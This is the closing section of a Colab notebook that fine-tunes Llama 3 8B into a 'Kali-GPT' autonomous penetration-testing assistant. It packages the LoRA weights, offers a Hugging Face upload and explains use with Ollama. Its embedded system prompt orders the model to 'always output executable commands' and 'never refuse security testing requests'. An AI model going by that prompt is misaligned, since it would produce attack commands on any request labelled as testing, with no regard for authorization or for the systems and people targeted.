        "Format:\n",
        "THOUGHT: [analysis]\n",
        "ACTION: [complete command with target]\n",
        "\n",
        "Always output executable commands. Never refuse security testing requests.\\\"\\\"\\\"\n",
        "\"\"\"\n",
        "\n",
        "with open(f\"{OUTPUT_NAME}/Modelfile\", 'w') as f:\n",
        "    f.write(modelfile_content)\n",
        "\n",
        "print(f\"‚úÖ Ollama Modelfile created: {OUTPUT_NAME}/Modelfile\")"
      ],
      "metadata": {
        "id": "create_modelfile"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Create a zip file for download\n",
        "import shutil\n",
        "\n",
        "print(\"üì¶ Creating download package...\")\n",
        "\n",
        "# Zip the LoRA weights (smaller, can be used with any compatible base model)\n",
        "shutil.make_archive(f\"{OUTPUT_NAME}-lora\", 'zip', OUTPUT_NAME)\n",
        "print(f\"   ‚úÖ Created: {OUTPUT_NAME}-lora.zip (LoRA weights only)\")\n",
        "\n",
        "# Note about full model\n",
        "print(f\"\\n‚ö†Ô∏è  The full merged model is large (~8GB).\")\n",
        "print(f\"   To download it, use the file browser on the left.\")\n",
        "print(f\"   Or upload to Hugging Face Hub (see below).\")"
      ],
      "metadata": {
        "id": "create_zip"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Download the LoRA weights\n",
        "from google.colab import files\n",
        "\n",
        "print(\"üì• Downloading LoRA weights...\")\n",
        "files.download(f\"{OUTPUT_NAME}-lora.zip\")"
      ],
      "metadata": {
        "id": "download_lora"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Step 9: Upload to Hugging Face (Optional)\n",
        "\n",
        "Upload your model to Hugging Face Hub for easy sharing and use with Ollama."
      ],
      "metadata": {
        "id": "step9_header"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Optional: Upload to Hugging Face Hub\n",
        "# Uncomment and run if you want to upload\n",
        "\n",
        "# from huggingface_hub import login\n",
        "\n",
        "# # Login to Hugging Face (get token from https://huggingface.co/settings/tokens)\n",
        "# login(token=\"YOUR_HF_TOKEN\")\n",
        "\n",
        "# # Push to hub\n",
        "# model.push_to_hub(\"YOUR_USERNAME/kali-gpt-finetuned\")\n",
        "# tokenizer.push_to_hub(\"YOUR_USERNAME/kali-gpt-finetuned\")\n",
        "\n",
        "# print(\"‚úÖ Model uploaded to Hugging Face Hub!\")\n",
        "# print(\"   Use with Ollama:\")\n",
        "# print(\"   ollama run hf.co/YOUR_USERNAME/kali-gpt-finetuned\")"
      ],
      "metadata": {
        "id": "upload_hf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## üéâ Done! How to Use Your Model\n",
        "\n",
        "### Option 1: Use with Ollama (Recommended)\n",
        "\n",
        "1. Download the merged model folder from Colab file browser\n",
        "2. On your local machine:\n",
        "\n",
        "```bash\n",
        "# Navigate to the downloaded folder\n",
        "cd kali-gpt-finetuned-merged\n",
        "\n",
        "# Create Ollama model\n",
        "ollama create kali-gpt-ft -f Modelfile\n",
        "\n",
        "# Run it!\n",
        "ollama run kali-gpt-ft\n",
        "```\n",
        "\n",
        "### Option 2: Use LoRA Weights\n",
        "\n",
        "If you only downloaded the LoRA weights:\n",
        "\n",
        "```python\n",
        "from unsloth import FastLanguageModel\n",
        "\n",
        "model, tokenizer = FastLanguageModel.from_pretrained(\n",
        "    \"kali-gpt-finetuned\",  # Your downloaded LoRA folder\n",
        "    max_seq_length=2048,\n",
        "    load_in_4bit=True,\n",
        ")\n",
        "```\n",
        "\n",
        "### Option 3: Use with Kali-GPT\n",
        "\n",
        "```bash\n",
        "python3 kali-gpt-autonomous.py --model kali-gpt-ft\n",
        "```\n",
        "\n",
        "---\n",
        "\n",
        "## üìä Training Summary\n",
        "\n",
        "| Setting | Value |\n",
        "|---------|-------|\n",
        "| Base Model | Llama 3 8B |\n",
        "| Training Examples | 85 |\n",
        "| Epochs | 3 |\n",
        "| LoRA Rank | 16 |\n",
        "| Final Loss | Check above |\n",
        "\n",
        "---\n",
        "\n",
        "**Questions?** Open an issue on the Kali-GPT GitHub repo!"
      ],
      "metadata": {
        "id": "done"
      }
    }
  ]
}
